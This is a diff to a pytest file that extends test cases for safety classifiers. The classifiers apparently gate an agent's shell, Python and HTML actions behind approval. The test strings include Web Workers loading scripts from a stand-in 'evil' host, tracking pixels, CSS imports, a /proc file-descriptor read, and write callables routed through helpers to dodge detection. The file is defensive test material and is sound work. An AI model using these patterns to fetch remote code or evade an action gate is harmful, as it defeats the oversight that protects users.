@@ -912,6 +912,36 @@ def test_terminal_classifier(command, unsafe):
             "import os\nopen(f'/proc/{os.getppid()}/fd/3').read()",
             True,
         ),  # f-string procfs fd symlink read
+        # huggingface_hub.hf_hub_download / snapshot_download fetch remote repo
+        # files over the network (and write an on-disk cache), so they ask.
+        (
+            "import huggingface_hub\nhuggingface_hub.hf_hub_download('r', 'f')",
+            True,
+        ),  # hub file download over the network
+        (
+            "from huggingface_hub import hf_hub_download\nhf_hub_download('r', 'f')",
+            True,
+        ),  # bare-imported hub file download
+        (
+            "from huggingface_hub import snapshot_download\nsnapshot_download('r')",
+            True,
+        ),  # bare-imported repo snapshot download
+        ("import statistics\nstatistics.mean([1, 2])", False),  # benign stdlib import stays safe
+        # A concrete write callable handed to a user-defined helper that can
+        # invoke it bypasses the direct open()/writer site, so it asks.
+        (
+            "def run(fn): fn('out.txt', 'w').write('x')\nrun(open)",
+            True,
+        ),  # open passed into a helper that calls it
+        (
+            "from numpy import save\ndef h(fn): fn('o.npy', a)\nh(save)",
+            True,
+        ),  # writer alias passed into a helper
+        (
+            "import numpy as np\ndef run(fn): fn('o.npy', a)\nrun(np.save)",
+            True,
+        ),  # attribute writer passed into a helper
+        ("def run(fn): return fn('x')\nrun(len)", False),  # benign callable arg stays safe
     ],
 )
 def test_python_classifier(code, unsafe):
@@ -940,6 +970,14 @@ def test_render_html_gated_only_when_networked():
     assert rh("<script src='https://cdn/x.js'></script>") is True
     assert rh("<script>new XMLHttpRequest().open('GET','/x')</script>") is True
     assert rh("<img src='https://evil/pixel.png'>") is True
+    # Worker / SharedWorker constructors run an off-thread script the scan cannot
+    # see (a module worker from a CORS CDN, or a blob/same-origin worker that
+    # fetches/importScripts) under worker-src http: https: blob:, so they ask.
+    assert rh("<script>new Worker('https://evil/w.js')</script>") is True
+    assert rh("<script>new Worker('https://cdn/x.mjs', {type: 'module'})</script>") is True
+    assert rh("<script>new SharedWorker('https://evil/w.js')</script>") is True
+    assert rh("<script>var myWorker = 1; console.log(myWorker)</script>") is False  # not a ctor
+    assert rh("<script>new WorkerPool(4)</script>") is False  # unrelated class, not a real Worker
     # Resource-loading forms beyond a direct fetch also reach the network.
     assert rh("<style>body{background:url(https://evil/x.png)}</style>") is True
     assert rh("<style>@import 'https://evil/x.css'</style>") is True
